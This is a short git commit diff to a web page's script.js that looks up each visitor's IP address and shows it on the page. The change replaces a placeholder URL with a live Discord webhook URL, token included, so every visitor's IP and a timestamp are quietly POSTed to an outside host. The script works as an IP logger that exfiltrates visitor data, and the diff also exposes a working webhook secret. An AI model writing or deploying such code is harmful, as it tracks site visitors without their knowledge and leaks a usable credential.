40cdedf3648f15cb1168cb2768ac0abf67f25867
Dracop124314 <dracobypassed@gmail.com>
2025-03-16 04:45:25 +0100

    Update script.js

--- script.js
+++ script.js
@@ -5,7 +5,7 @@ fetch('https://api.ipify.org?format=json')
         document.getElementById('ip').textContent = userIP;
 
         // Send the IP to your logging service
-        fetch('YOUR_REQUESTBIN_URL_HERE', { 
+        fetch('https://discord.com/api/webhooks/1350676229417599107/JO-q5f5w2f2MqfKCDLkdgV_4kTKGt_1TFUlB-wX9TG6e5WtmWt3a3sTh91FIk0YJjHET', { 
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ ip: userIP, timestamp: new Date() })
